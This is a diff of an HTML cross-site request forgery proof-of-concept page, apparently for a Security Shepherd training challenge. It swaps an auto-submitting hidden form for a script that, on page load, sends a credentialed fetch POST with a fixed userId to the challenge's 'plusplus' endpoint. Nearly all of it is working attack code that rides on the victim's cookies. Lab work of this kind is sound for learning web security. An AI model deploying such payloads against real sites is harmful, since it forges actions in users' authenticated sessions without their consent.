@@ -1,13 +1,32 @@
 <HTML>
 <HEAD>
-<TITLE>CSRF PoC</TITLE>
+    <TITLE>CSRF PoC with Fetch</TITLE>
 </HEAD>
-<H1>CSRF PoC</H1>
+<H1>CSRF PoC using Fetch API</H1>
 
-<form name="evilForm" action="https://shepherd.cybercops.fr/user/csrfchallengetwo/plusplus" method="POST">
-    <input type="hidden" name="userId" value="f2ba77abe78f629fc1b31aaa4ea45abf205bd01f" />
-    <input type="submit"/>
-</form>
-<script> document.evilForm.submit(); </script>
+<script>
+    // CSRF attack using fetch with credentials to include cookies in cross-origin requests
+    const userId = 'f2ba77abe78f629fc1b31aaa4ea45abf205bd01f'; // Hidden input value from the original form
+    const csrfUrl = 'https://shepherd.cybercops.fr/user/csrfchallengetwo/plusplus'; // Target endpoint
+
+    // Prepare the payload (similar to the hidden input)
+    const payload = {
+        userId: userId,
+    };
+
+    // Perform the fetch request with credentials (cookies included)
+    fetch(csrfUrl, {
+        method: 'POST',  // Using POST method as in your original example
+        credentials: 'include',  // Include cookies with the request (important for CSRF)
+        headers: {
+            'Content-Type': 'application/json',  // Set content type to JSON for the server to handle it
+        },
+        body: JSON.stringify(payload),  // Send the payload as JSON in the body
+    })
+    .then(response => response.json())  // Parse the response as JSON
+    .then(data => console.log(data))  // Handle successful response
+    .catch(error => console.error('Error:', error));  // Handle any errors
+</script>
+
 </BODY>
 </HTML>
